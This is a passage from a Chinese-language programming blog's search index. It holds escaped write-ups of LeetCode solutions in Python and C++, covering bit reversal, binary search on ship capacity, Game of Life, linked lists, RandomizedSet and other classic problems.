Solution: # @param n, an integer # @return an integer def reverseBits(self, n): ret, power = 0, 24 while n: ret += self.reverseByte(n \u0026amp; 0xff) \u0026lt;\u0026lt; power n = n \u0026gt;\u0026gt; 8 power -= 8 return ret # memoization with decorator @functools.lru_cache(maxsize=256) def reverseByte(self, byte): return (byte * 0x0202020202 \u0026amp; 0x010884422010) % 1023 Sol3: divide \u0026amp; conquer 切兩半，再交換，藉著在每個分區都做一樣的事\n不過因為是固定32位，所以可以直接用shift\nclass Solution: # @param n, an integer # @return an integer def reverseBits(self, n): n = (n \u0026gt;\u0026gt; 16) | (n \u0026lt;\u0026lt; 16) n = ((n \u0026amp; 0xff00ff00) \u0026gt;\u0026gt; 8) | ((n \u0026amp; 0x00ff00ff) \u0026lt;\u0026lt; 8) n = ((n \u0026amp; 0xf0f0f0f0) \u0026gt;\u0026gt; 4) | ((n \u0026amp; 0x0f0f0f0f) \u0026lt;\u0026lt; 4) n = ((n \u0026amp; 0xcccccccc) \u0026gt;\u0026gt; 2) | ((n \u0026amp; 0x33333333) \u0026lt;\u0026lt; 2) n = ((n \u0026amp; 0xaaaaaaaa) \u0026gt;\u0026gt; 1) | ((n \u0026amp; 0x55555555) \u0026lt;\u0026lt; 1) return n Sol4: push class Solution { public: uint32_t reverseBits(uint32_t n) { uint32_t ret = 0; for (int i=0; i\u0026lt;31; i++, n \u0026gt;\u0026gt;= 1, ret \u0026lt;\u0026lt;= 1) { ret = ret | (n\u0026amp;1); } if (n) ret = ret | (n\u0026amp;1); return ret; } }; Ref Bit Twiddling Hacks\n","permalink":"https://littlebees.github.io/2021/01/leetcode-190-reverse-bits/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e神奇的位元操作\u003c/p\u003e","title":"leetcode-190 - Reverse Bits"},{"content":"動機 sorted list的index，就是前面有幾個比自己小\nindex也可以這樣用!?\nProblem You are given an integer array nums and you have to return a new counts array. The counts array has the property where counts[i] is the number of smaller elements to the right of nums[i].\nExample 1:\nInput: nums = [5,2,6,1]Output: [2,1,1,0]Explanation:To the right of 5 there are 2 smaller elements (2 and 1).To the right of 2 there is only 1 smaller element (1).To the right of 6 there is 1 smaller element (1).To the right of 1 there is 0 smaller element.Example 2:\nInput: nums = [-1]Output: [0]Example 3:\nInput: nums = [-1,-1]Output: [0,0] Constraints:\n1 \u003c= nums.length \u003c= 105-104 \u003c= nums[i] \u003c= 104 Sol 這題最巧妙的是利用sorted list的index，就是前面有幾個比自己小的特性\n這樣只要從右手邊一個一個去插入，再看各自的index\n5212 ms，優化開始 (感覺這題有被多加測資，看sol分布圖中的92ms的code，拿來跑時間與這個差不多阿)\nclass Solution: def countSmaller(self, nums: List[int]) -\u0026gt; List[int]: l = [] ret = [] for n in reversed(nums): i = bisect_left(l,n) ret.append(i) l.insert(i,n) ret.reverse() return ret Sol2: SortedList insert的代價很大，換用SortedList\n460 ms\nfrom sortedcontainers import SortedList class Solution: def countSmaller(self, nums: List[int]) -\u0026gt; List[int]: l = [] ret = [] for n in reversed(nums): ret.append(bisect_left(l,n)) l.add(n) ret.reverse() return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-315-count-of-smaller-numbers-after-self/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003esorted list的index，就是\u003cstrong\u003e前面有幾個比自己小\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eindex也可以這樣用!?\u003c/p\u003e","title":"leetcode-315 - Count of Smaller Numbers After Self"},{"content":"動機 method call的代價會不會太高!? 見到bsearch的範圍的重要性 Problem A conveyor belt has packages that must be shipped from one port to another within days days.\nThe ith package on the conveyor belt has a weight of weights[i]. Each day, we load the ship with packages on the conveyor belt (in the order given by weights). We may not load more weight than the maximum weight capacity of the ship.\nReturn the least weight capacity of the ship that will result in all the packages on the conveyor belt being shipped within days days.\nExample 1:\nInput: weights = [1,2,3,4,5,6,7,8,9,10], days = 5Output: 15Explanation: A ship capacity of 15 is the minimum to ship all the packages in 5 days like this:1st day: 1, 2, 3, 4, 52nd day: 6, 73rd day: 84th day: 95th day: 10Note that the cargo must be shipped in the order given, so using a ship of capacity 14 and splitting the packages into parts like (2, 3, 4, 5), (1, 6, 7), (8), (9), (10) is not allowed.Example 2:\nInput: weights = [3,2,2,4,1,4], days = 3Output: 6Explanation: A ship capacity of 6 is the minimum to ship all the packages in 3 days like this:1st day: 3, 22nd day: 2, 43rd day: 1, 4Example 3:\nInput: weights = [1,2,3,1,1], days = 4Output: 3Explanation:1st day: 12nd day: 23rd day: 34th day: 1, 1 Constraints:\n1 \u003c= days \u003c= weights.length \u003c= 5 * 1041 \u003c= weights[i] \u003c= 500 Sol1 用二分去猜，要裝多少\n但這個解很慢，1948 ms\n後面就是慢慢優化的過程\nclass Solution: def fill(self,mid): tmp = 0 lastIndex = 1 ss = 0 for w in self.ws: if w \u0026gt; mid: return [self.D+1, 0] # force enlarge ss = max(ss,tmp) if tmp + w \u0026gt; mid: tmp = w lastIndex += 1 elif tmp + w == mid: #print(\u0026#34;HERE\u0026#34;,mid,ss) ss = max(ss,mid) tmp = 0 lastIndex += 1 else: tmp += w #print(\u0026#34;HERE\u0026#34;,ss,tmp) ss = max(ss,tmp) #print(\u0026#34;final\u0026#34;,ss) return [lastIndex, ss] def shipWithinDays(self, ws: List[int], D: int) -\u0026gt; int: self.ws = ws self.D = D i = min(sum(ws)//D,max(ws)) j = (sum(ws))+1 limit = 0 while i \u0026lt; j: mid = i + (j-i)//2 print(mid) lastIdx, limit = self.fill(mid) if lastIdx == D: j = mid elif lastIdx \u0026lt; D: j = mid else: i = mid+1 return self.fill(i)[1] Sol2 簡化加總 原本是加總後分成三個case，看小於、等於、大於上限 之後就看每個case的加總之後是要設定成多少\n不過可以在加新重量之前，就看會不會超過就好\n1080 ms\nclass Solution: def fill(self,mid): tmp = 0 lastIndex = 1 ss = 0 for w in self.ws: if tmp + w \u0026gt; mid: lastIndex += 1 tmp = 0 tmp += w ss = max(ss,tmp) return [lastIndex, ss] def shipWithinDays(self, ws: List[int], D: int) -\u0026gt; int: self.ws = ws self.D = D i = 1 j = (sum(ws))+1 limit = 0 while i \u0026lt; j: mid = i + (j-i)//2 #print(mid) lastIdx, limit = self.fill(mid) if lastIdx == D: j = mid elif lastIdx \u0026lt; D: j = mid else: i = mid+1 return self.fill(i)[1] Sol3: 縮小範圍 考慮到 D 等於 weights 長度的case，這會發生什麼事?\n[407,59,416,189,326,109,399,404,181,275,135,57,147,7,158,201,218,111,56,9,149,231,186,293,187,395,75,100,334,23,327,434] 32 每一次加總都會小於或等於D，這樣bsearch會出事，算出來的答案會一直降下去!! 這樣算出來的答案不會是容量，導致要另外紀錄目前加出來的的最大值(fill的ss)\n所以要把範圍縮小，最小至少要是所有重量的最大值，讓容量不會無下限的往下，這樣就可以直接把bsearch到的東西直接丟回去\n976 ms\nclass Solution: def fill(self,mid): tmp = 0 lastIndex = 1 ss = 0 for w in self.ws: if tmp + w \u0026gt; mid: lastIndex += 1 tmp = 0 tmp += w ss = max(ss,tmp) return [lastIndex, ss] def shipWithinDays(self, ws: List[int], D: int) -\u0026gt; int: self.ws = ws self.D = D j = (sum(ws)) i = max(ws) limit = 0 while i \u0026lt; j: mid = i + (j-i)//2 #print(mid) lastIdx, limit = self.fill(mid) if lastIdx == D: j = mid elif lastIdx \u0026lt; D: j = mid else: i = mid+1 return i Sol4: remove method call 還是很慢，如果把method call去掉的話\n560 ms\nclass Solution: def shipWithinDays(self, ws: List[int], D: int) -\u0026gt; int: j = sum(ws) i = max(j//D, max(ws)) limit = 0 while i \u0026lt; j: mid = i + (j-i)//2 tmp = 0 lastIndex = 1 #print(mid) for w in ws: if tmp + w \u0026gt; mid: lastIndex += 1 tmp = 0 tmp += w if lastIndex \u0026lt;= D: j = mid else: i = mid+1 return i Sol Final: 再縮小範圍 從Sol3，我們知道 最小至少要是所有重量的最大值\n那最大值應該是多少?\n總重量平均? 會太小，像是 [1,2,3,4,5,6,7,8,9,10], 5 就直接死亡 總重量? 太大了，所以前面的解才都那麼慢 平均會太小是因為有一些重量特別小，導致平均變小，所以可以 把每一個貨物當成最重的重量，去算平均\nclass Solution: def shipWithinDays(self, ws: List[int], D: int) -\u0026gt; int: i = max(ws) j = len(ws)*i //D + 1 limit = 0 while i \u0026lt; j: mid = i + (j-i)//2 tmp = 0 lastIndex = 1 for w in ws: if tmp + w \u0026gt; mid: lastIndex += 1 tmp = 0 tmp += w if lastIndex \u0026lt;= D: j = mid else: i = mid+1 return i ","permalink":"https://littlebees.github.io/2021/01/leetcode-1011-capacity-to-ship-packages-within-d-days/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003col\u003e\n\u003cli\u003emethod call的代價會不會太高!?\u003c/li\u003e\n\u003cli\u003e見到bsearch的範圍的重要性\u003c/li\u003e\n\u003c/ol\u003e","title":"leetcode-1011 - Capacity To Ship Packages Within D Days"},{"content":"動機 用數字代表狀態變化\nProblem According to Wikipedia's article: The Game of Life, also known simply as Life, is a cellular automaton devised by the British mathematician John Horton Conway in 1970.\nThe board is made up of an m x n grid of cells, where each cell has an initial state: live (represented by a 1) or dead (represented by a 0). Each cell interacts with its eight neighbors (horizontal, vertical, diagonal) using the following four rules (taken from the above Wikipedia article):\nAny live cell with fewer than two live neighbors dies as if caused by under-population.Any live cell with two or three live neighbors lives on to the next generation.Any live cell with more than three live neighbors dies, as if by over-population.Any dead cell with exactly three live neighbors becomes a live cell, as if by reproduction.The next state is created by applying the above rules simultaneously to every cell in the current state, where births and deaths occur simultaneously. Given the current state of the m x n grid board, return the next state.\nExample 1:\nInput: board = [[0,1,0],[0,0,1],[1,1,1],[0,0,0]]Output: [[0,0,0],[1,0,1],[0,1,1],[0,1,0]]Example 2:\nInput: board = [[1,1],[1,0]]Output: [[1,1],[1,1]] Constraints:\nm == board.lengthn == board[i].length1 \u003c= m, n \u003c= 25board[i][j] is 0 or 1. Follow up:\nCould you solve it in-place? Remember that the board needs to be updated simultaneously: You cannot update some cells first and then use their updated values to update other cells.In this question, we represent the board using a 2D array. In principle, the board is infinite, which would cause problems when the active area encroaches upon the border of the array (i.e., live cells reach the border). How would you address these problems? Sol class Solution: def count(self,i,j): pos = [[i-1,j-1],[i-1,j],[i-1,j+1], \\ [i,j-1], [i,j+1], \\ [i+1,j-1],[i+1,j],[i+1,j+1]] dirs = [p for p in pos if 0 \u0026lt;= p[0] and p[0] \u0026lt; len(self.b) and 0 \u0026lt;= p[1] and p[1] \u0026lt; len(self.b[0])] ret = 0 for d in dirs: if self.b[d[0]][d[1]] \u0026gt; 0: ret += 1 return ret def trans(self,i,j,live_die): if self.b[i][j] != live_die: if self.b[i][j] == 0: self.b[i][j] = -1 else: self.b[i][j] = 2 def gameOfLife(self, board: List[List[int]]) -\u0026gt; None: \u0026#34;\u0026#34;\u0026#34; Do not return anything, modify board in-place instead. \u0026#34;\u0026#34;\u0026#34; # 0: 0 -\u0026gt; 0 # 1: 1 -\u0026gt; 1 # -1: 0 -\u0026gt; 1 # 2: 1 -\u0026gt; 0 self.b = board # transition for i in range(len(self.b)): for j in range(len(self.b[0])): cnt = self.count(i,j) if cnt \u0026lt; 2: self.trans(i,j,0) elif cnt == 2: continue elif cnt == 3: self.trans(i,j,1) else: self.trans(i,j,0) # fix board for i in range(len(self.b)): for j in range(len(self.b[0])): if self.b[i][j] == -1: self.b[i][j] = 1 elif self.b[i][j] == 2: self.b[i][j] = 0 ","permalink":"https://littlebees.github.io/2021/01/leetcode-289-game-of-life/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用數字代表狀態變化\u003c/p\u003e","title":"leetcode-289 - Game of Life"},{"content":"動機 高級的X進制\nProblem Given a string columnTitle that represents the column title as appear in an Excel sheet, return its corresponding column number.\nFor example:\nA -\u003e 1B -\u003e 2C -\u003e 3...Z -\u003e 26AA -\u003e 27AB -\u003e 28 ... Example 1:\nInput: columnTitle = AOutput: 1Example 2:\nInput: columnTitle = ABOutput: 28Example 3:\nInput: columnTitle = ZYOutput: 701Example 4:\nInput: columnTitle = FXSHRXWOutput: 2147483647 Constraints:\n1 \u003c= columnTitle.length \u003c= 7columnTitle consists only of uppercase English letters.columnTitle is in the range [A, FXSHRXW]. Sol class Solution: def titleToNumber(self, s: str) -\u0026gt; int: mul = len(s)-1 s = list(s) ret = 0 for c in s: ret += (26**mul)*(ord(c)-ord(\u0026#39;A\u0026#39;)+1) mul -= 1 return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-171-excel-sheet-column-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e高級的X進制\u003c/p\u003e","title":"leetcode-171 - Excel Sheet Column Number"},{"content":"動機 就是算\nProblem Write an algorithm to determine if a number n is happy.\nA happy number is a number defined by the following process:\nStarting with any positive integer, replace the number by the sum of the squares of its digits.Repeat the process until the number equals 1 (where it will stay), or it loops endlessly in a cycle which does not include 1.Those numbers for which this process ends in 1 are happy.Return true if n is a happy number, and false if not.\nExample 1:\nInput: n = 19Output: trueExplanation:12 + 92 = 8282 + 22 = 6862 + 82 = 10012 + 02 + 02 = 1Example 2:\nInput: n = 2Output: false Constraints:\n1 \u003c= n \u003c= 231 - 1 Sol def happy(n): tmp = [int(x)*int(x) for x in list(str(n))] return sum(tmp) class Solution: def isHappy(self, n: int) -\u0026gt; bool: tbl = set() while n not in tbl and n != 1: tbl.add(n) n = happy(n) return (n == 1) ","permalink":"https://littlebees.github.io/2021/01/leetcode-202-happy-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就是算\u003c/p\u003e","title":"leetcode-202 - Happy Number"},{"content":"動機 不能動node內容!!\nProblem Given the heads of two singly linked-lists headA and headB, return the node at which the two lists intersect. If the two linked lists have no intersection at all, return null.\nFor example, the following two linked lists begin to intersect at node c1:\nThe test cases are generated such that there are no cycles anywhere in the entire linked structure.\nNote that the linked lists must retain their original structure after the function returns.\nCustom Judge:\nThe inputs to the judge are given as follows (your program is not given these inputs):\nintersectVal - The value of the node where the intersection occurs. This is 0 if there is no intersected node.listA - The first linked list.listB - The second linked list.skipA - The number of nodes to skip ahead in listA (starting from the head) to get to the intersected node.skipB - The number of nodes to skip ahead in listB (starting from the head) to get to the intersected node.The judge will then create the linked structure based on these inputs and pass the two heads, headA and headB to your program. If you correctly return the intersected node, then your solution will be accepted.\nExample 1:\nInput: intersectVal = 8, listA = [4,1,8,4,5], listB = [5,6,1,8,4,5], skipA = 2, skipB = 3Output: Intersected at '8'Explanation: The intersected node's value is 8 (note that this must not be 0 if the two lists intersect).From the head of A, it reads as [4,1,8,4,5]. From the head of B, it reads as [5,6,1,8,4,5]. There are 2 nodes before the intersected node in A; There are 3 nodes before the intersected node in B.Example 2:\nInput: intersectVal = 2, listA = [1,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1Output: Intersected at '2'Explanation: The intersected node's value is 2 (note that this must not be 0 if the two lists intersect).From the head of A, it reads as [1,9,1,2,4]. From the head of B, it reads as [3,2,4]. There are 3 nodes before the intersected node in A; There are 1 node before the intersected node in B.Example 3:\nInput: intersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2Output: No intersectionExplanation: From the head of A, it reads as [2,6,4]. From the head of B, it reads as [1,5]. Since the two lists do not intersect, intersectVal must be 0, while skipA and skipB can be arbitrary values.Explanation: The two lists do not intersect, so return null. Constraints:\nThe number of nodes of listA is in the m.The number of nodes of listB is in the n.0 \u003c= m, n \u003c= 3 * 1041 \u003c= Node.val \u003c= 1050 \u003c= skipA \u003c= m0 \u003c= skipB \u003c= nintersectVal is 0 if listA and listB do not intersect.intersectVal == listA[skipA] == listB[skipB] if listA and listB intersect. Follow up: Could you write a solution that runs in O(n) time and use only O(1) memory? Sol 一開始想到的是改node，去找出遇過兩次的node，但題目限制不能改內容\n所以只要讓兩條List的長度一樣，同時往後走看會不會遇到就ok了\ndef size(a): ret = 0 while a: ret += 1 a = a.next return ret class Solution: def getIntersectionNode(self, headA: ListNode, headB: ListNode) -\u0026gt; ListNode: sizeA = size(headA) sizeB = size(headB) common = min(sizeA,sizeB) for _ in range(sizeA-common): headA = headA.next for _ in range(sizeB-common): headB = headB.next #print(headA.val,headB.val) while headA and headB and (headA is not headB): headA = headA.next headB = headB.next return headA if (headA is headB) else None ","permalink":"https://littlebees.github.io/2021/01/leetcode-160-intersection-of-two-linked-lists/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e不能動node內容!!\u003c/p\u003e","title":"leetcode-160 - Intersection of Two Linked Lists"},{"content":"動機 merge sort的所有case都是O(nLog(n))!!\nProblem Given the head of a linked list, return the list after sorting it in ascending order.\nFollow up: Can you sort the linked list in O(n logn) time and O(1) memory (i.e. constant space)?\nExample 1:\nInput: head = [4,2,1,3]Output: [1,2,3,4]Example 2:\nInput: head = [-1,5,3,4,0]Output: [-1,0,3,4,5]Example 3:\nInput: head = []Output: [] Constraints:\nThe number of nodes in the list is in the range [0, 5 * 104].-105 \u003c= Node.val \u003c= 105 Sol 當初是先用qsort去寫，結果在極端與大的case吃鱉\n因為選的pivot通常不是好的，所以吃了一堆TLE\n所以要用merge sort\ndef havle(r): ptr = r mid = r endLeft = None while ptr and ptr.next: endLeft = mid mid = mid.next ptr = ptr.next.next right = mid endLeft.next = None return [r, right] def sort(r): if not r or not r.next: return r left, right = havle(r) left = sort(left) right = sort(right) ret = ListNode() ptr = ret while left or right: if left and right: if left.val \u0026lt;= right.val: ptr.next = left left = left.next else: ptr.next = right right = right.next ptr = ptr.next elif left: ptr.next = left break else: ptr.next = right break return ret.next class Solution: def sortList(self, head: ListNode) -\u0026gt; ListNode: return sort(head) ","permalink":"https://littlebees.github.io/2021/01/leetcode-148-sort-list/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003emerge sort的所有case都是O(nLog(n))!!\u003c/p\u003e","title":"leetcode-148 - Sort List"},{"content":"動機 這題的題目敘述真的不太好，夢回接手新任務，霧裡看花，用力撞牆的感覺\nProblem The count-and-say sequence is a sequence of digit strings defined by the recursive formula:\ncountAndSay(1) = 1countAndSay(n) is the way you would say the digit string from countAndSay(n-1), which is then converted into a different digit string.To determine how you say a digit string, split it into the minimal number of groups so that each group is a contiguous section all of the same character. Then for each group, say the number of characters, then say the character. To convert the saying into a digit string, replace the counts with a number and concatenate every saying.\nFor example, the saying and conversion for digit string 3322251:\nGiven a positive integer n, return the nth term of the count-and-say sequence.\nExample 1:\nInput: n = 1Output: 1Explanation: This is the base case.Example 2:\nInput: n = 4Output: 1211Explanation:countAndSay(1) = 1countAndSay(2) = say 1 = one 1 = 11countAndSay(3) = say 11 = two 1's = 21countAndSay(4) = say 21 = one 2 + one 1 = 12 + 11 = 1211 Constraints:\n1 \u003c= n \u003c= 30 Sol 就是看string中的數字直到變成鱉的數字之前，\n有幾個 是什麼數字 最後放到string中\nclass Solution: def countAndSay(self, n: int) -\u0026gt; str: if n == 1: return \u0026#34;1\u0026#34; else: s = self.countAndSay(n-1) chars = [] for c in s: if not chars or chars[-1][0] != c: chars.append([c,1]) else: chars[-1][1] += 1 ret = [] for p in chars: ret += [str(p[1]), p[0]] return \u0026#39;\u0026#39;.join(ret) ","permalink":"https://littlebees.github.io/2021/01/leetcode-38-count-and-say/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題的題目敘述真的不太好，夢回接手新任務，霧裡看花，用力撞牆的感覺\u003c/p\u003e","title":"leetcode-38 - Count and Say"},{"content":"動機 這題是靠觀察時間複雜度找到解法的\nProblem Given four integer arrays nums1, nums2, nums3, and nums4 all of length n, return the number of tuples (i, j, k, l) such that:\n0 \u003c= i, j, k, l \u003c nnums1[i] + nums2[j] + nums3[k] + nums4[l] == 0 Example 1:\nInput: nums1 = [1,2], nums2 = [-2,-1], nums3 = [-1,2], nums4 = [0,2]Output: 2Explanation:The two tuples are:1. (0, 0, 0, 1) -\u003e nums1[0] + nums2[0] + nums3[0] + nums4[1] = 1 + (-2) + (-1) + 2 = 02. (1, 1, 0, 0) -\u003e nums1[1] + nums2[1] + nums3[0] + nums4[0] = 2 + (-1) + (-1) + 0 = 0Example 2:\nInput: nums1 = [0], nums2 = [0], nums3 = [0], nums4 = [0]Output: 1 Constraints:\nn == nums1.lengthn == nums2.lengthn == nums3.lengthn == nums4.length1 \u003c= n \u003c= 200-228 \u003c= nums1[i], nums2[i], nums3[i], nums4[i] \u003c= 228 Sol 如果硬幹是O(n^4)，但如果當成某種3sum的話，就應該是合理的複雜度，也不會比這個更好，因為是必要試過所有組合\nclass Solution: def fourSumCount(self, A: List[int], B: List[int], C: List[int], D: List[int]) -\u0026gt; int: tmp = [] for c in C: for d in D: tmp.append(c+d) candidates = Counter(tmp) ret = 0 for a in A: for b in B: if -(a+b) in candidates: ret += candidates[-(a+b)] return ret ","permalink":"https://littlebees.github.io/2021/01/leetcode-454-4sum-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這題是靠觀察時間複雜度找到解法的\u003c/p\u003e","title":"leetcode-454 - 4Sum II"},{"content":"動機 從 數量 或 距離\nProblem Given an integer array nums and an integer k, return true if there are two distinct indices i and j in the array such that nums[i] == nums[j] and abs(i - j) \u003c= k.\nExample 1:\nInput: nums = [1,2,3,1], k = 3Output: trueExample 2:\nInput: nums = [1,0,1,1], k = 1Output: trueExample 3:\nInput: nums = [1,2,3,1,2,3], k = 2Output: false Constraints:\n1 \u003c= nums.length \u003c= 105-109 \u003c= nums[i] \u003c= 1090 \u003c= k \u003c= 105 Sol: 數量 用hash把一個範圍內的所有數字做統計\nclass Solution: def f(self,i): return any([self.ns[i] == self.ns[j] for j in range(i+1,min(i+self.k+1,len(self.ns)))]) def containsNearbyDuplicate(self, nums: List[int], k: int) -\u0026gt; bool: self.ns = nums self.k = k tbl = Counter(nums[:k+1]) for i in range(len(nums)): #print(\u0026#34;before\u0026#34;,tbl) if tbl.get(nums[i],0) \u0026gt; 1: return True if nums[i] in tbl and tbl[nums[i]] \u0026gt; 0: tbl[nums[i]] -= 1 if i+k+1 \u0026lt; len(nums): tbl[nums[i+k+1]] = tbl.get(nums[i+k+1],0)+1 #print(\u0026#34;after\u0026#34;,tbl) return False Case study: 距離 用hash把數字的index記錄下來，等下次遇到時算距離\nclass Solution: def containsNearbyDuplicate(self, nums: List[int], k: int) -\u0026gt; bool: if not nums: return False counts = {} for i,n in enumerate(nums): if n in counts and i-counts[n] \u0026lt;= k: return True else: counts[n] = i return False ","permalink":"https://littlebees.github.io/2021/01/leetcode-219-contains-duplicate-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e從 \u003cstrong\u003e數量\u003c/strong\u003e 或 \u003cstrong\u003e距離\u003c/strong\u003e\u003c/p\u003e","title":"leetcode-219 - Contains Duplicate II"},{"content":"動機 真的就是用rand!!\nProblem Implement the RandomizedSet class:\nRandomizedSet() Initializes the RandomizedSet object.bool insert(int val) Inserts an item val into the set if not present. Returns true if the item was not present, false otherwise.bool remove(int val) Removes an item val from the set if present. Returns true if the item was present, false otherwise.int getRandom() Returns a random element from the current set of elements (it's guaranteed that at least one element exists when this method is called). Each element must have the same probability of being returned.You must implement the functions of the class such that each function works in average O(1) time complexity.\nExample 1:\nInput[RandomizedSet, insert, remove, insert, getRandom, remove, insert, getRandom][[], [1], [2], [2], [], [1], [2], []]Output[null, true, false, true, 2, true, false, 2]ExplanationRandomizedSet randomizedSet = new RandomizedSet();randomizedSet.insert(1); // Inserts 1 to the set. Returns true as 1 was inserted successfully.randomizedSet.remove(2); // Returns false as 2 does not exist in the set.randomizedSet.insert(2); // Inserts 2 to the set, returns true. Set now contains [1,2].randomizedSet.getRandom(); // getRandom() should return either 1 or 2 randomly.randomizedSet.remove(1); // Removes 1 from the set, returns true. Set now contains [2].randomizedSet.insert(2); // 2 was already in the set, so return false.randomizedSet.getRandom(); // Since 2 is the only number in the set, getRandom() will always return 2. Constraints:\n-231 \u003c= val \u003c= 231 - 1At most 2 * 105 calls will be made to insert, remove, and getRandom.There will be at least one element in the data structure when getRandom is called. Sol #include \u0026lt;random\u0026gt; class RandomizedSet { private: list\u0026lt;int\u0026gt; l; unordered_map\u0026lt;int, list\u0026lt;int\u0026gt;::iterator\u0026gt; m; std::mt19937_64 rng; public: /** Initialize your data structure here. */ RandomizedSet() { std::random_device dev; std::mt19937_64 rng2(dev()); rng = rng2; } /** Inserts a value to the set. Returns true if the set did not already contain the specified element. */ bool insert(int val) { bool ret = 0; if (m.find(val) == m.end()) { l.push_front(val); m[val] = l.begin(); ret = 1; } return ret; } /** Removes a value from the set. Returns true if the set contained the specified element. */ bool remove(int val) { bool ret = 0; if (m.find(val) != m.end()) { l.erase(m[val]); m.erase(val); ret = 1; } return ret; } /** Get a random element from the set. */ int getRandom() { std::uniform_int_distribution\u0026lt;size_t\u0026gt; idDist(0, m.size() - 1); auto item = m.begin(); std::advance( item, idDist(rng) ); return item-\u0026gt;first; } }; ","permalink":"https://littlebees.github.io/2021/01/leetcode-380-insert-delete-getrandom-o1/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e真的就是用rand!!\u003c/p\u003e","title":"leetcode-380 - Insert Delete GetRandom O(1)"},{"content":"動機 greedy都是一種特別的想法，從一個等式或不等式開始\nProblem There are n gas stations along a circular route, where the amount of gas at the ith station is gas[i].\nYou have a car with an unlimited gas tank and it costs cost[i] of gas to travel from the ith station to its next (i + 1)th station. You begin the journey with an empty tank at one of the gas stations.\nGiven two integer arrays gas and cost, return the starting gas station's index if you can travel around the circuit once in the clockwise direction, otherwise return -1. If there exists a solution, it is guaranteed to be unique\nExample 1:\nInput: gas = [1,2,3,4,5], cost = [3,4,5,1,2]Output: 3Explanation:Start at station 3 (index 3) and fill up with 4 unit of gas. Your tank = 0 + 4 = 4Travel to station 4. Your tank = 4 - 1 + 5 = 8Travel to station 0. Your tank = 8 - 2 + 1 = 7Travel to station 1. Your tank = 7 - 3 + 2 = 6Travel to station 2. Your tank = 6 - 4 + 3 = 5Travel to station 3. The cost is 5. Your gas is just enough to travel back to station 3.Therefore, return 3 as the starting index.Example 2:\nInput: gas = [2,3,4], cost = [3,4,3]Output: -1Explanation:You can't start at station 0 or 1, as there is not enough gas to travel to the next station.Let's start at station 2 and fill up with 4 unit of gas. Your tank = 0 + 4 = 4Travel to station 0. Your tank = 4 - 3 + 2 = 3Travel to station 1. Your tank = 3 - 3 + 3 = 3You cannot travel back to station 2, as it requires 4 unit of gas but you only have 3.Therefore, you can't travel around the circuit once no matter where you start. Constraints:\ngas.length == ncost.length == n1 \u003c= n \u003c= 1040 \u003c= gas[i], cost[i] \u003c= 104 Sol 如果要能走完一圈，gas的總和一定大於cost的總和\n那起點是? 在走的時候一定不會讓gas與cost的差額小於0\n如果說起點一定在的話，就從起點開始走，看目前的gas總和與cost總和的差，是不是小於0，如果小於零，就把起點設定成目前的位置的下一位\nclass Solution: def canCompleteCircuit(self, gas: List[int], cost: List[int]) -\u0026gt; int: ret = 0 i = 0 tank = 0 cnt = 0 while i \u0026lt; len(gas): tank += gas[i]-cost[i] cnt += gas[i]-cost[i] if tank \u0026lt; 0: ret = (i+1)%len(gas) tank = 0 i+=1 return ret if cnt \u0026gt;= 0 else -1 ","permalink":"https://littlebees.github.io/2021/01/leetcode-134-gas-station/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003egreedy都是一種特別的想法，從一個等式或不等式開始\u003c/p\u003e","title":"leetcode-134 - Gas Station"},{"content":"動機 原本以為只要挑數字最大的就好\u0026hellip;\nProblem Given a list of non-negative integers nums, arrange them such that they form the largest number.\nNote: The result may be very large, so you need to return a string instead of an integer.\nExample 1:\nInput: nums = [10,2]Output: 210Example 2:\nInput: nums = [3,30,34,5,9]Output: 9534330Example 3:\nInput: nums = [1]Output: 1Example 4:\nInput: nums = [10]Output: 10 Constraints:\n1 \u003c= nums.length \u003c= 1000 \u003c= nums[i] \u003c= 109 Sol1 以[111311, 1113]為例，如果挑最大數字，就會把111311放前面，就會出事 但[432,43243]，就要挑最大數字\n這裡的問題是，把相同的prefix去掉後，要怎麼比?\n把剩下的數字，接上相同的prefix，取與另一邊一樣的長度，再去比\n432,43243 =\u0026gt; , 43 =\u0026gt; 432, \u0026#34;43\u0026#34; + \u0026#34;4\u0026#34; =\u0026gt; 432,434 def com(a,b): i = 0 j = 0 while i \u0026lt; len(a) and j \u0026lt; len(b): if a[i] == b[j]: i += 1 j += 1 elif a[i] \u0026gt; b[j]: return 1 else: return -1 if i \u0026gt;= len(a) and j \u0026gt;= len(b): return 0 else: if i \u0026gt;= len(a): b = b[j:] + a[:len(b)-j-1] else: a = a[i:] + b[:len(a)-i-1] return com(a,b) class Solution: def largestNumber(self, nums: List[int]) -\u0026gt; str: nums = [str(n) for n in nums] nums.sort(key=cmp_to_key(com), reverse=True) ret = \u0026#34;\u0026#34; for n in nums: ret += n return str(int(ret)) Sol2 如果說都要接上的話，為什麼不比較一個在前一個在後的大小就好\ndef com(a,b): x, y = [a+b,b+a] if x \u0026gt; y: return 1 elif x \u0026lt; y: return -1 else: return 0 class Solution: def largestNumber(self, nums: List[int]) -\u0026gt; str: nums = [str(n) for n in nums] nums.sort(key=cmp_to_key(com), reverse=True) ret = \u0026#34;\u0026#34; for n in nums: ret += n return str(int(ret)) 